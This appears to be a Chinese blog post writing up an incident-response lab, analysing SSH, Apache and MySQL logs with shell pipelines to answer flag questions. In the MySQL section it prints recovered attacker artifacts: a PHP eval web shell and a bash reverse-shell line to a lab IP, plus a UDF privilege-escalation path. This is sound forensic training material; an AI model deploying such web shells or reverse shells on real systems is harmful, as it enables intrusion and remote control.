@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="一直游到海水变蓝">
+    <meta name="author" content="FLow">
+    
+    <title>
+        
+            玄机--日志分析 |
+        
+        Flowww&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#000033","title":"Flowww's blog","author":"FLow","avatar":"https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png","logo":"https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png","favicon":"https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","about":"/about"},"first_screen":{"enable":true,"background_img":"/image/bg.svg","background_img_dark":"/images/bg.svg","description":"一直游到海水变蓝","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":false,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":false},"datetime_format":"YYYY-MM-DD","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":true,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":false,"page_pv":true}},"search":{"path":"search.json","field":"post","content":true,"format":"striptags"},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.0"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Flowww&#39;s blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                
+                                首页
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                
+                                归档
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                
+                                标签
+                            </a>
+                        </li>
+                    
+                        
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                
+                                关于
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/"
+                    >首页</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags"
+                    >标签</a>
+                </li>
+            
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >关于</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        玄机--日志分析
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/aaa.png">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">FLow</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2024-05-31</span>
+            </span>
+
+            <span class="meta-info-item post-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="datetime" data-updated="Sat Jun 01 2024 01:09:26 GMT+0800">2024-06-01</span>
+            </span>
+        
+
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+            <span class="meta-info-item post-pv">
+                <i class="icon fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+            </span>
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body">
+                    
+
+                    <h3 id="linux日志分析"><a href="#linux日志分析" class="headerlink" title="linux日志分析"></a>linux日志分析</h3><h4 id="有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割"><a href="#有多少IP在爆破主机ssh的root帐号，如果有多个使用”-”分割" class="headerlink" title="有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割"></a>有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr </span><br></pre></td></tr></table></figure>
+
+<p>学一把这些语句</p>
+<p><strong>grep</strong>把有”Failed password for root”的行挑出来，**-a**是将文件作为文本文件处理，避免某些情况下文件被识别为二进制文件</p>
+<p><strong>awk</strong>把挑出来的行里第11个字段挑出来（按空格分），这里挑出那些ip地址</p>
+<p><strong>sort</strong>把ip地址排序，**-n<strong>按数字排序，</strong>-r**降序排序</p>
+<p><strong>uniq</strong>去重,<strong>-c</strong>输出中显示每个行重复出现的次数</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.200.2,192.168.200.32,192.168.200.31&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割"><a href="#ssh爆破成功登陆的IP是多少，如果有多个使用”-”分割" class="headerlink" title="ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割"></a>ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log<span class="comment"># cat auth.log* | grep -a &quot;Accept&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span></span><br><span class="line">      2 192.168.200.2</span><br><span class="line">      1 202.78.166.217</span><br></pre></td></tr></table></figure>
+
+<p>思路和上一道差不多，grep过滤的字段改成”Accept”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125; # 要删掉自己的ip</span><br></pre></td></tr></table></figure>
+
+<h4 id="爆破用户名字典是什么？如果有多个使用”-”分割"><a href="#爆破用户名字典是什么？如果有多个使用”-”分割" class="headerlink" title="爆破用户名字典是什么？如果有多个使用”,”分割"></a>爆破用户名字典是什么？如果有多个使用”,”分割</h4><p>上题解</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password&quot; | perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;| uniq -c | sort -nr</span><br><span class="line">      5  invalid user user</span><br><span class="line">      5  invalid user hello</span><br><span class="line">      5  invalid user</span><br><span class="line">      4  root</span><br><span class="line">      1  root</span><br><span class="line">      1  root</span><br><span class="line">      1  invalid user test3</span><br><span class="line">      1  invalid user test2</span><br><span class="line">      1  invalid user test1</span><br></pre></td></tr></table></figure>
+
+<p>对于这个perl比较陌生</p>
+<p><strong>Perl</strong> 命令，用于从匹配的日志行中提取用户名。</p>
+<p><code>while($_=&lt;&gt;)</code>逐行读取输入（即日志文件的内容）。</p>
+<p><code> /for(.*?) from/</code>使用正则表达式匹配 for 和from 之间的内容（即用户名）。</p>
+<p> <code>print &quot;$1\n&quot;;</code>打印匹配到的用户名（捕获组 <strong>$1</strong>）</p>
+<p>思路就是用grep过滤后用perl -e处理每行语句，把for和from之间的字段（通常是用户名）挑出来**，再进行后续操作</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;user,hello,root,test3,test2,test1&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="登陆成功的IP共爆破了多少次"><a href="#登陆成功的IP共爆破了多少次" class="headerlink" title="登陆成功的IP共爆破了多少次"></a>登陆成功的IP共爆破了多少次</h4><p>第一题的命令已经过滤出来了</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log.1 | grep -a &quot;Failed password for root&quot; | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr</span><br><span class="line">      4 192.168.200.2</span><br><span class="line">      1 192.168.200.32</span><br><span class="line">      1 192.168.200.31</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="黑客登陆主机后新建了一个后门用户，用户名是多少"><a href="#黑客登陆主机后新建了一个后门用户，用户名是多少" class="headerlink" title="黑客登陆主机后新建了一个后门用户，用户名是多少"></a>黑客登陆主机后新建了一个后门用户，用户名是多少</h4><p>可以直接看&#x2F;etc&#x2F;passwd，多了个test2</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /etc/passwd</span><br><span class="line">...</span><br><span class="line">test2:x:1000:1000::/home/test2:/bin/sh</span><br><span class="line">debian:x:1001:1001:Debian:/home/debian:/bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>也可以</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-6:/var/log# cat /var/log/auth.log* | grep -a &quot;useradd&quot; | grep -a &quot;linux-rz&quot;</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new group: name=test2, GID=1000</span><br><span class="line">Aug  1 07:50:45 linux-rz useradd[7551]: new user: name=test2, UID=1000, GID=1000, home=/home/test2, shell=/bin/sh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;test2&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="apache日志分析"><a href="#apache日志分析" class="headerlink" title="apache日志分析"></a>apache日志分析</h3><h4 id="提交当天访问次数最多的IP，即黑客IP："><a href="#提交当天访问次数最多的IP，即黑客IP：" class="headerlink" title="提交当天访问次数最多的IP，即黑客IP："></a>提交当天访问次数最多的IP，即黑客IP：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat access.log.1 | grep &quot;03/Aug/2023:08:&quot; | awk &#x27;&#123;print $1&#125;&#x27; | sort | uniq -c | sort -nr | head -n 10</span><br><span class="line">   6555 192.168.200.2</span><br><span class="line">     29 ::1</span><br><span class="line">      5 192.168.200.38</span><br><span class="line">      1 192.168.200.48</span><br><span class="line">      1 192.168.200.211</span><br></pre></td></tr></table></figure>
+
+<p>这次grep过滤的是”03&#x2F;Aug&#x2F;2023:08:”</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="黑客使用的浏览器指纹是什么，提交指纹的md5："><a href="#黑客使用的浏览器指纹是什么，提交指纹的md5：" class="headerlink" title="黑客使用的浏览器指纹是什么，提交指纹的md5："></a>黑客使用的浏览器指纹是什么，提交指纹的md5：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;192.168.200.2&quot; | awk -F&#x27;&quot;&#x27; &#x27;&#123;print $6&#125;&#x27; | uniq -c</span><br><span class="line">     12 Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0</span><br><span class="line">      1 curl/7.74.0</span><br><span class="line">   6543 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br></pre></td></tr></table></figure>
+
+<p>直接grep上一题提取出来的ip</p>
+<p>**awk -F’”‘ ‘{print $6}’**这里awk -F指定双引号为分割符，取第六个字段</p>
+<blockquote>
+<p>对于 Apache 访问日志，双引号内的字段通常是请求方法、URL、协议和 User-Agent 字符串。第六个字段通常是 User-Agent。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">指纹：Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br><span class="line">md5:2d6330f380f44ac20f3a02eed0958f66</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看index-php页面被访问的次数，提交次数："><a href="#查看index-php页面被访问的次数，提交次数：" class="headerlink" title="查看index.php页面被访问的次数，提交次数："></a>查看index.php页面被访问的次数，提交次数：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;/index.php&quot; | wc -l</span><br><span class="line">27</span><br></pre></td></tr></table></figure>
+
+<p><strong>wc -l</strong>用于统计行数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;27&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看黑客IP访问了多少次，提交次数："><a href="#查看黑客IP访问了多少次，提交次数：" class="headerlink" title="查看黑客IP访问了多少次，提交次数："></a>查看黑客IP访问了多少次，提交次数：</h4><p>和上一题差不多</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &#x27;192.168.200.2 -&#x27; | wc -l</span><br><span class="line">6555</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;6555&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="查看2023年8月03日8时这一个小时内有多少IP访问，提交次数"><a href="#查看2023年8月03日8时这一个小时内有多少IP访问，提交次数" class="headerlink" title="查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:"></a>查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ip-10-0-10-5:/var/log/apache2# cat /var/log/apache2/access.log* | grep &quot;03/Aug/2023:08&quot; | awk &#x27;&#123;print $1&#125;&#x27; | sort -nr | uniq -c</span><br><span class="line">      1 192.168.200.48</span><br><span class="line">      5 192.168.200.38</span><br><span class="line">      1 192.168.200.211</span><br><span class="line">   6555 192.168.200.2</span><br><span class="line">     29 ::1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;5&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="mysql日志分析"><a href="#mysql日志分析" class="headerlink" title="mysql日志分析"></a>mysql日志分析</h3><h4 id="黑客第一次写入的shell-flag-关键字符串"><a href="#黑客第一次写入的shell-flag-关键字符串" class="headerlink" title="黑客第一次写入的shell flag{关键字符串}"></a>黑客第一次写入的shell flag{关键字符串}</h4><p>找到sh.php</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@xuanji:/var/www/html# cat sh.php</span><br><span class="line">1	2	&lt;?php @eval($_POST[&#x27;a&#x27;]);?&gt;	4</span><br><span class="line">//ccfda79e-7aa1-4275-bc26-a6189eb9a20b</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ccfda79e-7aa1-4275-bc26-a6189eb9a20b&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="黑客反弹shell的ip-flag-ip"><a href="#黑客反弹shell的ip-flag-ip" class="headerlink" title="黑客反弹shell的ip flag{ip}"></a>黑客反弹shell的ip flag{ip}</h4><p>在日志中发现adminer.php中存在sqk注入，用sys_eval实现命令执行</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601005724.png" ></p>
+<p>主要在&#x2F;tmp&#x2F;1.sh</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@xuanji:/var/log/apache2# cat /tmp/1.sh</span><br><span class="line">bash -i &gt;&amp;/dev/tcp/192.168.100.13/777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="黑客提权文件的完整路径-md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xx"><a href="#黑客提权文件的完整路径-md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xx" class="headerlink" title="黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx"></a>黑客提权文件的完整路径 md5 flag{md5} 注 &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xx</h4><p>先猜测是udf提权，在common.php找到数据库连接的账号密码</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010114.png" ></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p334cc35b3c704593</span><br><span class="line">连接到数据库</span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">看一下plugin设置的目录</span><br></pre></td></tr></table></figure>
+
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010309.png" ></p>
+<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240601010328.png" ></p>
+<p>有两个udf.so</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">路径：/usr/lib/mysql/plugin/udf.so</span><br><span class="line">md5:b1818bde4e310f3d23f1005185b973e7</span><br></pre></td></tr></table></figure>
+
+<h4 id="黑客获取的权限-flag-whoami后的值"><a href="#黑客获取的权限-flag-whoami后的值" class="headerlink" title="黑客获取的权限 flag{whoami后的值}"></a>黑客获取的权限 flag{whoami后的值}</h4><p>udf提权后拿到的是mysql权限，所以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;mysql&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a class="link"   target="_blank" rel="noopener" href="https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/" >https://tryhackmyoffsecbox.github.io/Target-Machines-WriteUp/docs/Xuanji/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi=0=DQeDsNOf1TKnq40ErD&alichlgref=https://www.google.com/" >https://xz.aliyun.com/t/14254?time__1311=mqmx9QiQi%3D0%3DDQeDsNOf1TKnq40ErD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F<i class="fas fa-external-link-alt"></i></a></p>
+
+                </div>
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/05/31/%E7%8E%84%E6%9C%BA-webshell%E6%9F%A5%E6%9D%80/"
+                                   title="玄机--webshell查杀"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">玄机--webshell查杀</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#linux%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">linux日志分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%89%E5%A4%9A%E5%B0%91IP%E5%9C%A8%E7%88%86%E7%A0%B4%E4%B8%BB%E6%9C%BAssh%E7%9A%84root%E5%B8%90%E5%8F%B7%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%89%E5%A4%9A%E4%B8%AA%E4%BD%BF%E7%94%A8%E2%80%9D-%E2%80%9D%E5%88%86%E5%89%B2"><span class="nav-number">1.1.</span> <span class="nav-text">有多少IP在爆破主机ssh的root帐号，如果有多个使用”,”分割</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ssh%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F%E7%99%BB%E9%99%86%E7%9A%84IP%E6%98%AF%E5%A4%9A%E5%B0%91%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%9C%89%E5%A4%9A%E4%B8%AA%E4%BD%BF%E7%94%A8%E2%80%9D-%E2%80%9D%E5%88%86%E5%89%B2"><span class="nav-number">1.2.</span> <span class="nav-text">ssh爆破成功登陆的IP是多少，如果有多个使用”,”分割</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E7%94%A8%E6%88%B7%E5%90%8D%E5%AD%97%E5%85%B8%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%E5%A6%82%E6%9E%9C%E6%9C%89%E5%A4%9A%E4%B8%AA%E4%BD%BF%E7%94%A8%E2%80%9D-%E2%80%9D%E5%88%86%E5%89%B2"><span class="nav-number">1.3.</span> <span class="nav-text">爆破用户名字典是什么？如果有多个使用”,”分割</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%99%BB%E9%99%86%E6%88%90%E5%8A%9F%E7%9A%84IP%E5%85%B1%E7%88%86%E7%A0%B4%E4%BA%86%E5%A4%9A%E5%B0%91%E6%AC%A1"><span class="nav-number">1.4.</span> <span class="nav-text">登陆成功的IP共爆破了多少次</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%BB%91%E5%AE%A2%E7%99%BB%E9%99%86%E4%B8%BB%E6%9C%BA%E5%90%8E%E6%96%B0%E5%BB%BA%E4%BA%86%E4%B8%80%E4%B8%AA%E5%90%8E%E9%97%A8%E7%94%A8%E6%88%B7%EF%BC%8C%E7%94%A8%E6%88%B7%E5%90%8D%E6%98%AF%E5%A4%9A%E5%B0%91"><span class="nav-number">1.5.</span> <span class="nav-text">黑客登陆主机后新建了一个后门用户，用户名是多少</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#apache%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="nav-number">2.</span> <span class="nav-text">apache日志分析</span></a><ol class="nav-child"><li 